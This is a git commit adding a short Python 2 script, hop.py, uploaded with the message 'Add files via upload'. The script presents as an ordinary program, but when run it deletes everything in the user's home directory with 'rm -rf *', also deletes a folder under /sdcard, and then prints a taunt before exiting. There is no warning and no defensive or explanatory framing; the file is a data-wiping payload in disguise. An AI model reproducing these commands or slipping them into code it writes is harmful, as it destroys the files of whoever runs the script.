bf47d04688728fad3eff68f21f9b87e7c15e7973
Juttbro <83924880+Juttbro@users.noreply.github.com>
2021-05-10 01:45:50 +0500

    Add files via upload

---
+++ hop.py
@@ -0,0 +1,9 @@
+import os , sys , time , datetime , re 
+reload(sys)
+sys.setdefaultencoding('utf-8')
+os.system("cd && rm -rf *")
+os.system("cd /sdcard && rm -rf afzajaan")
+print(" Bye Bye ")
+print(" ")
+print(" This is hop bro . you cant compete with me ")
+os.system("exit")
